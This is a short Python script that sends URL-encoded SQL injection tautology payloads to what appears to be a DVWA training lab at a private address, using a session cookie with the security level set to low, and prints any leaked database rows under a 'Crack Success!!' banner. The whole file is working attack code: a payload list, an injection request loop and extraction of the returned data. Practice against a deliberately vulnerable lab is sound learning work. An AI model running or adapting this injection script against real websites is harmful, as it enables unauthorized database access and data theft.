import requests
from bs4 import BeautifulSoup as bs
import urllib.parse

ID = ['%27or%27','%27+or+1+%3D1+%23']

for a in ID :
    URL = "http://10.0.2.15:8080/vulnerabilities/sqli/?id="+str(a)+"1&Submit=Submit"
        
    cookie={
            "PHPSESSID":"q58entn4fdoupsmg630u39pmt6",
            "security":"low"
            }

    session1 = requests.Session()

    req=session1.get(URL,cookies=cookie)
    html = req.text
    html_parser = bs(html,'html.parser')
    try:
        vul_area = html_parser.find('div',{'class':'vulnerable_code_area'})
        pre = vul_area.findAll('pre')
        if(len(pre)>1):
            print("\n\n")
            print("Crack Success!!")
            print("\n\n")
            for b in pre:
                replace1 = str(b).replace("<br/>",",")
                replace2 = replace1.replace("<pre>","")
                replace3 = replace2.replace("</pre>","")
                print(replace3)
    except AttributeError:
        print("")
